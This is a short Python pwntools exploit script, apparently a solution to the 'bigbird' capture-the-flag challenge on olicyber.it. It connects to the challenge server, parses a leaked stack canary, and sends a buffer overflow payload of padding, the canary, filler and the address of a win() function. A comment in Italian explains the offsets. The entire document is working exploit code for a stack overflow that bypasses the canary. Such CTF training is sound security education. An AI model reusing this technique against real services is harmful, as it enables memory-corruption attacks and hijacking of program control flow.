    from pwn import *

r = remote ('bigbird.challs.olicyber.it',12006)

r.recvuntil('BIRD: ')

canary = int( r.recvline().strip(), 16 )

r.readline()

payload = b'A'* 40 +p64(canary) + b'A'*8+p64(0x401715) #0x38-0x10=40 di buffer- canary in modo che non cambi- 8 bytes per il Rip-indirizzo funzione win()

r.sendline(payload)

r.interactive()
